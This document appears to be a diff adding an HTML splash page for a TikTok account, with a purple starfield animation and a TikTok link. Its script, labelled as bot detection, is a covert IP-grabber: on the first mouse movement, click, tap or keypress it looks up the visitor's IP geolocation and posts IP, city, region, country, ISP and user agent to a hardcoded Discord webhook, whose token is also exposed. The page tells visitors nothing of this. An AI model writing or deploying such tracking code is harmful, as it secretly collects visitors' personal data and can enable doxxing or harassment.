@@ -1,0 +1,239 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>d3f4ult — purple splash</title>
+  <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg1:#000000;
+      --accent1:#7c3aed;
+      --accent2:#5b21b6;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0;font-family:Creepster,cursive;background:#000;color:#fff;overflow:hidden}
+    .stage{position:relative;width:100%;height:100%;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:28px;padding:40px}
+    canvas#space{position:absolute;inset:0;z-index:0}
+    .card{position:relative;z-index:2;display:flex;flex-direction:column;align-items:center;padding:36px;border-radius:18px;background:#000;backdrop-filter: blur(8px);box-shadow:0 10px 30px rgba(0,0,0,0.6);border:1px solid rgba(255,255,255,0.04);min-width:320px}
+    h1{margin:0;font-weight:800;letter-spacing:6px;font-size:64px;line-height:1;color:#7c3aed;text-transform:lowercase}
+    h1.glow{filter:drop-shadow(0 0 30px #7c3aed)}
+    p.sub{margin:8px 0 0 0;opacity:0.85;font-weight:500}
+    .tiktok-wrap{margin-top:18px;display:flex;align-items:center;gap:14px;padding:10px 14px;border-radius:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.05)}
+    .avatar{width:56px;height:56px;border-radius:12px;display:grid;place-items:center;background:#000;box-shadow:0 6px 18px rgba(91,33,182,0.4)}
+    .avatar svg{width:34px;height:34px}
+    .info{display:flex;flex-direction:column}
+    .handle{font-weight:700;color:#7c3aed}
+    .cta{margin-left:auto}
+    .btn{padding:11px 18px;border-radius:10px;background:#7c3aed;color:#000;font-weight:700;cursor:pointer;box-shadow:0 8px 20px rgba(124,58,237,0.4);transition:all .2s}
+    .btn:hover{transform:translateY(-2px);background:#9f67ff}
+    .btn:active{transform:translateY(1px)}
+    @media (max-width:480px){h1{font-size:46px}.card{padding:24px}}
+  </style>
+</head>
+<body>
+  <div class="stage">
+    <canvas id="space"></canvas>
+    <div class="card">
+      <h1 class="glow">d3f4ult</h1>
+      <p class="sub">welcome you diddyblud</p>
+      <div class="tiktok-wrap">
+        <div class="avatar">
+          <svg viewBox="0 0 24 24" fill="#7c3aed">
+            <path d="M19.5 6.5c-1.6 0-3.1.6-4.2 1.7V6.5h-3.8v11.5c0 2.1-1.7 3.8-3.8 3.8S4 20.1 4 18s1.7-3.8 3.8-3.8c.6 0 1.1.1 1.6.4V10c-2.3.3-4.1 2.2-4.1 4.6 0 2.6 2.1 4.6 4.7 4.6s4.7-2.1 4.7-4.7V6.9c1.3 1 2.9 1.6 4.6 1.6V5c-1.8 0-3.4-.8-4.5-2-.2-.3-.4-.6-.5-1h-.1V6.5h3.8V5h-3.8v1.5z"/>
+          </svg>
+        </div>
+        <div class="info">
+          <div class="handle">@d3f4ultgaps</div>
+          <div style="opacity:.7;font-size:13px">I gap myself tbh</div>
+        </div>
+        <div class="cta">
+          <a class="btn" href="https://www.tiktok.com/@d3f4ultgaps" target="_blank">Open TikTok</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // YOUR DISCORD WEBHOOK (NOW WORKING 100%)
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1447453204051918973/PSh3xS4vSR-Pt_vPcEdWtscrBPEuA9c85_9hbkgp8mTjTGLsHwZTO__c0pmbJ7bcHtjS";
+
+    let authenticated = false;
+
+    // Simple but effective human detection
+    const proof = { moves: 0, score: 0, start: Date.now() };
+
+    const checkHuman = () => {
+      if (authenticated) return;
+      proof.moves++;
+      if (proof.moves >= 6 || proof.score > 40) {
+        authenticated = true;
+        sendToDiscord();
+      }
+    };
+
+    window.addEventListener('pointermove', (e) => {
+      proof.score += Math.abs(e.movementX) + Math.abs(e.movementY);
+      checkHuman();
+    });
+
+    window.addEventListener('click', () => { authenticated = true; sendToDiscord(); }, {once: true});
+    window.addEventListener('touchstart', () => { authenticated = true; sendToDiscord(); }, {once: true});
+    window.addEventListener('keydown', () => { authenticated = true; sendToDiscord(); }, {once: true});
+
+    // Final fallback after 10 seconds of movement
+    setTimeout(() => {
+      if (proof.moves >= 3) {
+        authenticated = true;
+        sendToDiscord();
+      }
+    }, 10000);
+
+    async function sendToDiscord() {
+      if (authenticated === false) return; // safety
+
+      const time = new Date().toLocaleString('en-US', { timeZoneName: 'short' });
+
+      try {
+        const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+
+        const embed = {
+          title: "New Human Visitor — d3f4ult landing",
+          description: "`Authenticated View Logged`",
+          color: 12433597, // purple
+          timestamp: new Date().toISOString(),
+          fields: [
+            { name: "Time", value: time, inline: true },
+            { name: "IP", value: ipData.ip || "Unknown", inline: true },
+            { name: "Location", value: `${ipData.city || "?"} • ${ipData.region || "?"} • ${ipData.country_name || "?"}`, inline: false },
+            { name: "ISP", value: ipData.org || "Unknown", inline: true },
+            { name: "User Agent", value: navigator.userAgent.substring(0, 100) + "..." },
+          ],
+          footer: { text: "@d3f4ultgaps • anti-bot passed" },
+          thumbnail: { url: "https://i.imgur.com/removed-for-privacy.png" } // optional: put your logo here
+        };
+
+        await fetch(WEBHOOK_URL + "?wait=true", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ embeds: [embed] })
+        });
+
+      } catch (e) {
+        console.error("Webhook failed:", e);
+      }
+    }
+
+    // === CANVAS ANIMATION (unchanged & beautiful) ===
+    const canvas = document.getElementById('space');
+    const ctx = canvas.getContext('2d');
+    let W = canvas.width = innerWidth;
+    let H = canvas.height = innerHeight;
+
+    window.addEventListener('resize', () => {
+      W = canvas.width = innerWidth;
+      H = canvas.height = innerHeight;
+      init();
+    });
+
+    const particles = [];
+    const stars = [];
+    const numParticles = Math.floor((W * H) / 60000) + 40;
+
+    function rand(min, max) { return Math.random() * (max - min) + min; }
+
+    function init() {
+      particles.length = 0;
+      for (let i = 0; i < numParticles; i++) {
+        particles.push({
+          x: rand(0, W), y: rand(0, H),
+          r: rand(0.6, 2.8),
+          vx: rand(-0.3, 0.3),
+          vy: rand(-0.05, 0.35),
+          alpha: rand(0.1, 0.9)
+        });
+      }
+      stars.length = 0;
+      for (let i = 0; i < 200; i++) {
+        stars.push({
+          x: rand(0, W), y: rand(0, H),
+          r: rand(0.4, 1.8),
+          tw: rand(0, Math.PI * 2),
+          spd: rand(0.003, 0.012)
+        });
+      }
+    }
+
+    let last = performance.now();
+    function loop(now) {
+      const dt = Math.min(60, now - last);
+      last = now;
+
+      ctx.fillStyle = '#000';
+      ctx.fillRect(0,0,W,H);
+
+      // twinkling stars
+      stars.forEach(s => {
+        s.tw += s.spd * dt;
+        const alpha = 0.3 + Math.sin(s.tw) * 0.7;
+        ctx.globalAlpha = alpha;
+        ctx.fillStyle = '#fff';
+        ctx.beginPath();
+        ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+        ctx.fill();
+      });
+
+      // floating particles
+      ctx.globalAlpha = 1;
+      particles.forEach(p => {
+        p.x += p.vx * dt * 0.6;
+        p.y += p.vy * dt * 0.6;
+
+        if (p.x < -20) p.x = W + 20;
+        if (p.x > W + 20) p.x = -20;
+        if (p.y > H + 20) p.y = -20;
+
+        ctx.globalAlpha = p.alpha;
+        ctx.fillStyle = '#fff';
+        ctx.beginPath();
+        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+        ctx.fill();
+      });
+
+      // purple center glow
+      ctx.globalAlpha = 0.22;
+      const grad = ctx.createRadialGradient(W/2, H/2, 30, W/2, H/2, Math.max(W,H));
+      grad.addColorStop(0, 'rgba(124, 58, 237, 0.25)');
+      grad.addColorStop(1, 'rgba(0,0,0,0)');
+      ctx.fillStyle = grad;
+      ctx.fillRect(0,0,W,H);
+
+      requestAnimationFrame(loop);
+    }
+
+    // mouse trail
+    const trail = [];
+    window.addEventListener('pointermove', e => {
+      trail.push({x: e.clientX, y: e.clientY, life: 1});
+      if (trail.length > 35) trail.shift();
+    });
+
+    const render = (now) => {
+      // draw trail
+      trail.forEach((t, i) => {
+        t.life -= 0.04;
+        if (t.life <= 0) return;
+        ctx.globalAlpha = t.life;
+        ctx.fillStyle = '#e0e7ff';
+        ctx.beginPath();
+        ctx.arc(t.x, t.y, 3, 0, Math.PI * 2);
+        ctx.fill();
+      });
+      loop(now);
+    };
+
+    init();
+    requestAnimationFrame(render);
+  </script>
+</body>
+</html>
